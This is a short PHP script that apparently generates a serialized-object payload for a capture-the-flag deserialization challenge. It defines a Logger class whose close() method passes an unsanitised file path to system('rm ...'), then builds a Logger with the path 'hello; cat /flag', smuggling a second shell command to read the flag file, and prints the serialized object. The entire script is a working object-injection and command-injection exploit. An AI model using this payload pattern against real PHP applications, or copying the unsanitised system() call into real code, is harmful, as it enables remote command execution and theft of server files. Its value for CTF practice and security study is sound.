<?php

class Database {
    public $conn;
    public function __construct($conn) {
        $this->conn = $conn;
    }

}



class Logger {
    public $filepath;
    public function __construct($filepath) {
        $this->filepath = $filepath;    
    }

    public function close() {
        system("rm " . $this->filepath);
    }

}
$conn = new Logger("hello; cat /flag");
$db = new Database($conn);

echo serialize($db);

?>